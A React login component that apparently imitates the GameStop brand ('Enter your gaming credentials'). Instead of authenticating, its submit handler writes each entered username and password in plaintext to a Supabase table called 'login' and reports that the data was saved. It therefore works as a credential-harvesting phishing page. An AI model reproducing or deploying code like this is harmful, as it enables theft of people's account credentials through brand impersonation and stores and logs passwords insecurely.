import { useState } from "react";
import { supabase } from "./supabase";

function Login() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [message, setMessage] = useState("");

  const handleLogin = async (e) => {
    e.preventDefault();

    if (!username || !password) {
      setMessage("Please enter Username and Password");
      return;
    }

    const { data, error } = await supabase
  .from("login")
  .insert([
    {
      Username: username,
      Password: password,
    },
  ])
  .select();

console.log("DATA:", data);
console.log("ERROR:", error);

    if (error) {
      console.log(error);
      setMessage("Failed to save data");
      return;
    }

    setMessage("Login data saved successfully!");

    setUsername("");
    setPassword("");
  };

  return (
    <div className="login-page">
      <div className="login-container">
        <h1>GAMESTOP</h1>

        <p className="login-subtitle">
          Enter your gaming credentials
        </p>

        <form onSubmit={handleLogin}>
          <input
            type="text"
            placeholder="Username"
            value={username}
            onChange={(e) =>
              setUsername(e.target.value)
            }
          />

          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) =>
              setPassword(e.target.value)
            }
          />

          <button type="submit">
            Login
          </button>
        </form>

        {message && (
          <p
            style={{
              marginTop: "15px",
              color: "#00ffff",
            }}
          >
            {message}
          </p>
        )}
      </div>
    </div>
  );
}

export default Login;